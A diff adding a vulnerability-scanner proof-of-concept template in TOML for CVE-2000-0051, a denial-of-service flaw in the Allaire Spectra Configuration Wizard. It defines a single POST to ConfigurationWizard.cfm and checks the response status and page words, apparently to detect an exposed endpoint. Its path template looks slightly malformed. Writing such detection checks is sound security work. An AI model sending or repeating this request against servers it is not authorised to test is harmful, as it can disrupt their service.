@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "验证 Allaire Spectra 1.0 Configuration Wizard 拒绝服务漏洞：通过反复提交数据集合索引请求，消耗服务器资源导致服务不可用"
+id = "POC-AVE-2000-0043"
+name = "CVE-2000-0051 PoC"
+severity = "medium"
+tags = ["ave-2000-0043"]
+vuln_id = [
+    "CVE-2000-0051",
+    "AVE-2000-0043",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/Spectra/ConfigurationWizard.cfm"
+protocol = "http"
+
+[poc.requests.body]
+content = "collection=index&action=submit&data=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Configuration Wizard",
+    "Indexing",
+]
